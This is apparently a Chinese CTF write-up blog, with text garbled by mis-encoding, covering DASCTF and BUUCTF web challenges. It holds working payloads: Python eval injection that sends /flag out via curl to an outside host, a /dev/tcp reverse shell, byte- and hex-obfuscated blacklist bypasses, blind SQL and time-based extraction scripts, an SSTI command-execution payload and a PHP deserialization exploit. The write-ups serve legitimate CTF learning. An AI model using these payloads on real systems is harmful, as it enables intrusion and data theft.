<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request,session</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> create</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## flag is in /flag try to get it</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"or"</span> <span class="keyword">in</span> string:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hack"</span></span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        input = request.form[<span class="string">'input'</span>]</span><br><span class="line">        create_question = create()</span><br><span class="line">        input_question = session.get(<span class="string">'question'</span>)</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"Invalid session please try again!"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"hack"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(input_question + <span class="string">"="</span> + str(input))))</span><br><span class="line">            <span class="keyword">if</span> calc_result == <span class="string">'True'</span>:</span><br><span class="line">                result = <span class="string">"Congratulations"</span></span><br><span class="line">            <span class="keyword">elif</span> calc_result == <span class="string">'False'</span>:</span><br><span class="line">                result = <span class="string">"Error"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=result,question=create_question)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        create_question = create()</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,question=create_question)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">"app.py"</span>, <span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>åªè¿‡æ»¤äº† <code>or</code> ,å› ä¸ºä¸æ˜¯ç›´æ¥å›æ˜¾ï¼Œæ‰€ä»¥è€ƒè™‘ç›²æ³¨ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥åå¼¹shellï¼Œcurlå¤–å¸¦</p>
<p>curlå¤–å¸¦</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="number">1234</span>|<span class="built_in">os</span>.<span class="built_in">popen</span>(<span class="string">'cat /flag | curl http://1.1.1.1:2333 --data-binary @-'</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/6æœˆåˆ·é¢˜è®°å½•/image-20200628174548750.png" alt="image-20200628174548750"></p>
<p>åå¼¹shell</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">1234</span>|<span class="selector-tag">open</span>(<span class="string">'/tmp/c.sh'</span>,<span class="string">'w'</span>)<span class="selector-class">.write</span>(<span class="string">'/bin/bash -i &gt; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1'</span>),<span class="selector-tag">os</span><span class="selector-class">.system</span>(<span class="string">'/bin/bash /tmp/c.sh'</span>)</span><br></pre></td></tr></table></figure>

<p>ç›²æ³¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = <span class="string">"abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"DASCTF"</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">    url = <span class="string">"http://183.129.189.60:10026/"</span></span><br><span class="line">    data=&#123;<span class="string">'input'</span>:<span class="string">'1234|os.system(\'cat /flag|grep &#123;&#125; &amp;&amp; sleep 2\')'</span>.format(payload + i)&#125;</span><br><span class="line">    print(data)</span><br><span class="line">    first = time.time()</span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    second = time.time()</span><br><span class="line">    offset = second-first</span><br><span class="line">    <span class="keyword">if</span> offset &gt; <span class="number">2</span>:</span><br><span class="line">        payload = payload+i</span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>åé¢é¢˜ç›®ä¸‹çº¿äº†ï¼Œå¬è¯´æ˜¯è¢«<code>os.system()</code>æ‰“ç©¿äº†</p>
<h3 id="9-DASCTF-å…­æœˆèµ›-ç®€å•çš„è®¡ç®—é¢˜2"><a href="#9-DASCTF-å…­æœˆèµ›-ç®€å•çš„è®¡ç®—é¢˜2" class="headerlink" title="9.[DASCTF å…­æœˆèµ›]ç®€å•çš„è®¡ç®—é¢˜2"></a>9.<strong>[DASCTF å…­æœˆèµ›]ç®€å•çš„è®¡ç®—é¢˜2</strong></h3><p>å…¶ä»–å’Œ1ä¸€æ ·ï¼Œä½†è¿‡æ»¤æ›´ä¸¥æ ¼äº†</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> request.<span class="keyword">method</span><span class="operator"> == </span>'POST':</span><br><span class="line">        input = request.form<span class="literal">['<span class="identifier">input</span>']</span></span><br><span class="line">        create_question = create<span class="literal">()</span></span><br><span class="line">        input_question = session.get('question')</span><br><span class="line">        session<span class="literal">['<span class="identifier">question</span>']</span> = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question<span class="operator"> == </span>None:</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="string">"Invalid session please try again!"</span>, <span class="params">question</span>=<span class="params">create_question</span>)</span></span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="string">"hack"</span>, <span class="params">question</span>=<span class="params">create_question</span>)</span></span><br><span class="line">        calc_str = input_question + <span class="string">"="</span> + str(input)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(calc_str)))</span><br><span class="line">        except Exception <span class="keyword">as</span> ex:</span><br><span class="line">            calc_result = <span class="string">"Invalid"</span></span><br><span class="line">        return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="params">calc_result</span>,<span class="params">question</span>=<span class="params">create_question</span>)</span></span><br></pre></td></tr></table></figure>

<p>åé¢çˆ¬ä¸‹æ¥çš„é»‘åå•</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">black_list</span> = [ <span class="string">'os'</span>, <span class="string">'mro'</span>, <span class="string">'request'</span>, <span class="string">'args'</span>, <span class="string">'eval'</span>, <span class="string">'system'</span>,<span class="string">'if'</span>, <span class="string">'for'</span>,<span class="string">'subprocess'</span>, <span class="string">'file'</span>, <span class="string">'builtins'</span>,<span class="string">'compile'</span>,<span class="string">'execfile'</span>,<span class="string">'from_pyfile'</span>,<span class="string">'config'</span>,<span class="string">'local'</span>,<span class="string">'self'</span>,<span class="string">'enter'</span>,<span class="string">'%'</span>,<span class="string">'or'</span>,<span class="string">'ls'</span>,<span class="string">'sys'</span>,<span class="string">'globals'</span>,<span class="string">'read'</span>,<span class="string">'popen'</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½† <code>exec</code>æ²¡è¢«ç¦æ‰€ä»¥å’Œ1ä¸€æ ·ï¼Œä½† <code>exec</code>è¿”å›ä¸ºç©ºæ‰€ä»¥ç”¨<code>,</code>åˆ†å‰²</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">"os.system('cat /flag | curl http://1.1.1.1:2333 --data-binary @-')"</span></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    payload += str(ord(i))+<span class="string">','</span></span><br><span class="line">print(payload)</span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    payload += str(hex(ord(i))).replace(<span class="string">"0x"</span>,<span class="string">""</span>).zfill(<span class="number">2</span>)</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>,exec(<span class="string">'o'</span>+<span class="string">'s.sy'</span>+<span class="string">'stem("sleep 10")'</span>)  <span class="comment">//æ˜æ˜¾å»¶æ—¶äº†</span></span><br><span class="line"><span class="number">1</span>,exec(bytes([<span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">40</span>, <span class="number">39</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">32</span>, <span class="number">124</span>, <span class="number">32</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">32</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">45</span>, <span class="number">39</span>, <span class="number">41</span>]).decode()) <span class="comment">//curlå¤–å¸¦</span></span><br><span class="line"><span class="number">1</span>,exec(bytes.fromhex(<span class="string">'6f732e73797374656d2827636174202f666c6167207c206375726c20687474703a2f2f312e312e312e313a32333333202d2d646174612d62696e61727920402d2729'</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li><p>åˆ©ç”¨ç»§æ‰¿é“¾</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],<span class="string">'__cla'</span>+<span class="string">'ss__'</span>),<span class="string">'__mr'</span>+<span class="string">'o__'</span>)[<span class="number">1</span>],<span class="string">'__subclas'</span>+<span class="string">'ses__'</span>)()[<span class="number">104</span>],<span class="string">'__init__'</span>),<span class="string">'__glob'</span>+<span class="string">'al'</span>+<span class="string">'s__'</span>)[<span class="string">'sy'</span>+<span class="string">'s'</span>],<span class="string">'mod'</span>+<span class="string">'ules'</span>)[<span class="string">'o'</span>+<span class="string">'s'</span>],<span class="string">'sy'</span>+<span class="string">'ste'</span>+<span class="string">'m'</span>)(<span class="string">'l'</span>+<span class="string">'s'</span>)//ç»•waf</span><br></pre></td></tr></table></figure>
</li>
<li><p>å­—ç¬¦æ‹¼æ¥</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eval(<span class="string">"o"</span>+<span class="string">"s.s"</span>+<span class="string">"y"</span>+<span class="string">"s"</span>+<span class="string">"t"</span>+<span class="string">"e"</span>+<span class="string">"m('wh"</span>+<span class="string">"oa"</span>+<span class="string">"m"</span>+<span class="string">"i')"</span>)</span><br><span class="line">exec(<span class="string">"o"</span>+<span class="string">"s.s"</span>+<span class="string">"y"</span>+<span class="string">"s"</span>+<span class="string">"t"</span>+<span class="string">"e"</span>+<span class="string">"m('wh"</span>+<span class="string">"oa"</span>+<span class="string">"m"</span>+<span class="string">"i')"</span>)</span><br></pre></td></tr></table></figure>


</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>åˆ·é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title>8æœˆåˆ·é¢˜è®°å½•</title>
    <url>/2020/08/8%E6%9C%88%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h3><p>ä¼ªåè®®åŠ æ–‡ä»¶åŒ…å«</p><p><code>?file=php://filter/read/convert.base64-encode/resource=flag.php</code></p><h3 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h3><p>å‘½ä»¤æ‰§è¡Œ</p><p><code>127.0.0.1;cat /flag</code></p><h3 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h3><a id="more"></a>



<p>çœ‹é¢˜ç›®ç›´æ¥æ‰«ç›®å½•</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200802182510227.png" alt="image-20200802182510227"></p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200802182531380.png" alt="image-20200802182531380"></p>
<p>å¼±ç±»å‹æ¯”è¾ƒ</p>
<p><code>?key=123</code></p>
<h3 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h3><p>phtmlç»•è¿‡</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200802184054101.png" alt="image-20200802184054101"></p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200802184125661.png" alt="image-20200802184125661"></p>
<h3 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h3><p>è¿‡æ»¤äº†unionã€andã€orã€ç©ºæ ¼ç­‰ï¼ŒåŒ…æ‹¬<code>/**/</code></p>
<p>è¾“å…¥<code>1/1</code>æ—¶ä¼šæ­£å¸¸è¿”å›ç»“æœï¼Œå¯ä»¥åˆ¤æ–­è¿™æ˜¯æ•°å­—å‹çš„sqlæ³¨å…¥ã€‚</p>
<p>å¯ä»¥ç”¨<code>()</code>ç»•è¿‡ç©ºç™½ç¬¦</p>
<p>payload</p>
<p><code>if(ascii(substr((select(flag)from(flag)),1,1))=ascii(&#39;f&#39;),1,2)</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://1bc1fd51-0f6f-43b5-bd9e-c19e86a6e238.node3.buuoj.cn/index.php'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)"</span>.format(x, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆä¼ å‚ <code>text=welcome to the zjctf</code> è¿™é‡Œè¦æ³¨æ„<code>file_get_contents</code>ï¼Œä¸èƒ½ç›´æ¥GETä¼ å‚ï¼Œè¦é€šè¿‡ä¼ªåè®®ã€‚</p>
<p>dataï¼štext=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p>
<p>input: text=php://input,ç„¶åPOST <code>welcome to the zjctf</code></p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200808211240153.png" alt="image-20200808211240153"></p>
<p>æŒ‰ç…§æç¤ºè¯»å–<code>useless.php</code></p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200808211342281.png" alt="image-20200808211342281"></p>
<p>useless.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a= <span class="keyword">new</span> Flag();</span><br><span class="line">$a = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200808211534697.png" alt="image-20200808211534697"></p>
<h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="BJDCTF2020]Easy MD5"></a>BJDCTF2020]Easy MD5</h3><p>headersä¸­æœ‰æç¤º</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200808223026062.png" alt="image-20200808223026062"></p>
<p>md5($pass,true)çš„ç»“æœæ˜¯åŸå§‹çš„äºŒè¿›åˆ¶æ ¼å¼å­—ç¬¦ä¸²ï¼Œæ‹¼æ¥åˆ°è¯­å¥ä¸­å°±å¯èƒ½ä¼šé€ æˆSQLæ³¨å…¥ã€‚</p>
<p>å…·ä½“å‚è€ƒï¼š<em><a href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/" target="_blank" rel="noopener">http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</a></em></p>
<p>è¾“å…¥å¯†ç  <code>ffifdyop</code>ï¼Œå³å¯ç™»å½•ã€‚</p>
<p>æ¥åˆ°ä¸‹ä¸€å…³</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200808223634396.png" alt="image-20200808223634396"></p>
<p>ç›´æ¥æ•°ç»„ç»•è¿‡</p>
<p><code>http://3a0f2829-16ea-4ecd-b023-04ac47f0511a.node3.buuoj.cn/levels91.php?a[]=2&amp;b[]=3</code></p>
<p>ä¸‹ä¸€å…³</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200808223852953.png" alt="image-20200808223852953"></p>
<p>è¿˜æ˜¯æ•°ç»„ç»•è¿‡</p>
<p>æˆ–è€…åˆ©ç”¨<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">å·¥å…·</a>ç¢°æ’</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200808230558650.png" alt="image-20200808230558650"></p>
<h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>éšä¾¿è¾“ä¸ªå­—ç¬¦ä¸²ï¼Œä¼šç›´æ¥è¿”å›è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚ç»“æœçš„æºç æç¤ºäº†SSTI</p>
<p><code>1</code>è¿”å›1ï¼Œç¡®å®å­˜åœ¨SSTIã€‚è€Œä¸”æ²¡è¿‡æ»¤ã€‚</p>
<p>æŸ¥çœ‹æ ¹ç›®å½•</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(<span class="string">"__import__('os').popen('ls /').read()"</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ç€ç”¨ä¸Šé¢çš„è¯»å–flagå³å¯</p>
<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">  $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">  $host = escapeshellarg($host);</span><br><span class="line">  $host = escapeshellcmd($host);</span><br><span class="line">  $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">  @mkdir($sandbox);</span><br><span class="line">  chdir($sandbox);</span><br><span class="line">  <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>escapeshellarg()</code>å’Œ <code>escapeshellcmd(t)</code>åŒæ—¶ä½¿ç”¨ä¼šé€ æˆå•å¼•å·é€ƒé€¸</p>
<p>å…·ä½“å‚è€ƒï¼š<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a></p>
